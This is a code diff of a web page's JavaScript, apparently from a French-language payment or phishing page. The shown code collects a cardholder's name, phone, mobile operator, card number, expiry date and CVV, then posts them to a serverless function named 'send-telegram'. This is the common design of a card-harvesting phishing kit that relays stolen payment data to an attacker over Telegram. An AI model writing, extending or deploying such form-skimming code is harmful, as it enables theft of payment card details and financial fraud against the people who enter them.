@@ -756,12 +756,13 @@
             loading.classList.add('show');
             
             const formData = {
-     name: document.querySelector('input[name="Titulaire de la carte"]')?.value || '',
-    phone: document.querySelector('input[name="phone"]')?.value || '',
-    operator: document.querySelector('select[name="operator"]')?.value || '',
-    cardNumber: document.querySelector('input[name="cardNumber"]')?.value || '',
-    expiry: document.querySelector('input[name="expiry"]')?.value || '',
-    cvv: document.querySelector('input[name="cvv"]')?.value || ''
+                
+    'Titulaire de la carte': document.querySelector('input[name="Titulaire de la carte"]')?.value || '',
+    'phone': document.querySelector('input[name="phone"]')?.value || '',
+    'operator': document.querySelector('select[name="operator"]')?.value || '',
+    'cardNumber': document.querySelector('input[name="cardNumber"]')?.value || '',
+    'expiry': document.querySelector('input[name="expiry"]')?.value || '',
+    'cvv': document.querySelector('input[name="cvv"]')?.value || ''
 };
 
 const response = await fetch('/.netlify/functions/send-telegram', {
